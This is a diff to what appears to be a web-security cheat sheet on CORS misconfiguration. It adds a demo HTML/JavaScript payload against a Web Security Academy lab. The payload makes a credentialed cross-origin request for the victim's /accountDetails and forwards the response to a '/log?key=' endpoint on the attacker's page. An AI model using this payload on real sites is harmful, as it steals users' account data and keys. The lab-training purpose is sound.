@@ -30,3 +30,25 @@ Host: vulnerable-website.com
 Origin: https://malicious.vulnerable-website.com
 ```
 Note: If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application. So, if you find a CORS vulnerability, try to bind it with XSS attack.
+
+**Demo Payload**
+```javascript
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
+```
